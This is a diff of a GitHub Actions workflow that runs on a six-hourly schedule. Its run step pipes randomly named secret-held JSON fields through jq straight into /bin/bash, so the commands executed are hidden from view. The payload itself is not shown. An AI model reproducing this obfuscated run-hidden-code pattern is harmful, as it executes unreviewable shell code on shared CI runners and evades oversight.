@@ -1,23 +1,27 @@
 name: chenmeijiao2010
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '1 2/6 * * *'
+    - cron: '39 0/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: chenmeijiao2010
         env:
-          md0: ${{ secrets.md0 }}
+          ixqm0804: ${{ secrets.ixqm0804 }}
         run: |
-          echo $md0 | jq -r .ih13 | /bin/bash
-          echo $err6884 | jq -r .er326 | /bin/bash
-          echo $vkwd104 | jq -r .reqmm3486 | /bin/bash
-          echo $y587 | jq -r .vas6086 | /bin/bash
-          echo $nahna561 | jq -r .pjodc03760 | /bin/bash
-          echo $ehg6219 | jq -r .oxezk696 | /bin/bash
-          echo $fl651 | jq -r .lt6525 | /bin/bash
-          echo $qd05 | jq -r .qg37 | /bin/bash
+          echo $ixqm0804 | jq -r .sc07 | /bin/bash
+          echo $bxqc7696 | jq -r .d99 | /bin/bash
+          echo $zxlm0846 | jq -r .t4119 | /bin/bash
+          echo $lr08974 | jq -r .gw39 | /bin/bash
+          echo $nal601 | jq -r .nzox8307 | /bin/bash
+          echo $swki16912 | jq -r .qsuhb41 | /bin/bash
+          echo $qq39 | jq -r .bwl88 | /bin/bash
+          echo $nlann9891 | jq -r .csuxb5 | /bin/bash
+          echo $kfotx5827 | jq -r .jt2468 | /bin/bash
 
